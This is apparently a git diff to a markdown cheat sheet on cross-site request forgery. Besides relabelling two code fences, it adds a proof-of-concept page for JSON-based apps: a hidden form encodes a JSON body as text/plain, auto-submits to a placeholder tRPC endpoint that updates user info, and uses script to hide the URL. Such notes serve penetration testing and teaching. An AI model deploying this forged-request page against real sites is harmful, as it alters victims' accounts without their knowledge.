@@ -79,7 +79,7 @@ To escalate the risk of a CSRF attack:
 
   
 
-```php
+```html
 
 // A vulnerable form that lacks CSRF protection
 
@@ -289,7 +289,7 @@ here is the code used
 ### 2 a sample of poc of csrf that checks for refereal header 
 
 
-```
+```html
 <html>
 <head>
     <meta name="referrer" content="never">
@@ -307,7 +307,22 @@ here is the code used
 </html>
 
 ``` 
+### POC if the application uses JSON to send the data 
 
+```html
+<html>
+  <body>
+    <form action="https://dashboard.target.com/trpc/users.updateUserInfo?batch=1" method="POST" enctype="text/plain">
+      <input type="hidden" name="&#123;&quot;0&quot;&#58;&#123;&quot;accountName&quot;&#58;&quot;Cyberar s&quot;&#44;&quot;name&quot;&#58;&quot;asdf ccccc&quot;&#44;&quot;subscribed&quot;&#58;&quot;on&quot;&#44;&quot;phone&quot;&#58;&quot;1099424296&quot;&#44;&quot;country&quot;&#58;&quot;EG" value="&quot;&#125;&#125;&#13;&#10;" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
 ## tips
 tips 
 - may be checking for referrer header  [writeup ](https://flex0geek.blogspot.com/2019/04/critical-ibm-bypass-csrf-protection.html)
